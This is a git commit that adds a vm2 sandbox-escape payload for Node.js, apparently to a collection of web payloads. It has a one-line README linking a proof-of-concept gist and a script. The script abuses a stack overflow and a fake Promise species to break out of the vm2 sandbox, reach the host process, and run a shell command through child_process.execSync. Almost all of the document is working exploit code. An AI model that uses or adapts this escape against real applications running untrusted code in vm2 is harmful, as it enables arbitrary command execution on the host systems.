efd9b18f6adb92560bdc2bc8d2b4fc8f8c98b9ce
ov3rflw <louis.arounso@yandex.com>
2024-01-14 02:43:31 +0100

    add vm2 escape payload

---
+++ web/nodejs/vm2/README.md
@@ -0,0 +1,1 @@
+POC : https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9
---
+++ web/nodejs/vm2/script.js
@@ -0,0 +1,25 @@
+const {VM} = require("vm2");
+const vm = new VM();
+
+const code = `
+async function fn() {
+    (function stack() {
+        new Error().stack;
+        stack();
+    })();
+}
+p = fn();
+p.constructor = {
+    [Symbol.species]: class FakePromise {
+        constructor(executor) {
+            executor(
+                (x) => x,
+                (err) => { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch pwned'); }
+            )
+        }
+    }
+};
+p.then();
+`;
+
+console.log(vm.run(code));
